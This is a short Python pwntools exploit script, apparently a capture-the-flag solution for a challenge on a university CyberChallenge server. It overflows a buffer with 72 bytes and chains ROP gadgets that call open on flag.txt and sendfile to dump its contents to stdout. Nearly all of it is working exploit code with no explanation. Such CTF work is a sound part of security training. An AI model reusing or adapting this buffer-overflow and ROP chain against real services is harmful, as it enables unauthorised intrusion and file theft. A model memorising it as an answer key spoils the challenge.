from pwn import *

if args["REMOTE"]:
    p = remote("cyberchallenge.disi.unitn.it", 50260)
else:
    p = process("./bin")

offset = 72 

# addresses
flag = p64(0x404020)
open = p64(0x000000000040119f)
sendfile = p64(0x00000000004011a9)
pop_r10 = p64(0x000000000040119c)
pop_rbp = p64(0x000000000040111d)
pop_rdi = p64(0x0000000000401196)
pop_rdx = p64(0x000000000040119a)
pop_rsi = p64(0x0000000000401198)

# 72 bytes to reach the return address
payload = b"A" * offset

# OPEN flag.txt
payload += pop_rdi
payload += flag
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += open

# SENDFILE content to stdout
payload += pop_rdi
payload += p64(1)
payload += pop_rsi
payload += p64(6)
payload += pop_rdx
payload += p64(0)
payload += pop_r10
payload += p64(100)
payload += sendfile

# send payload
p.sendline(payload)
p.interactive()
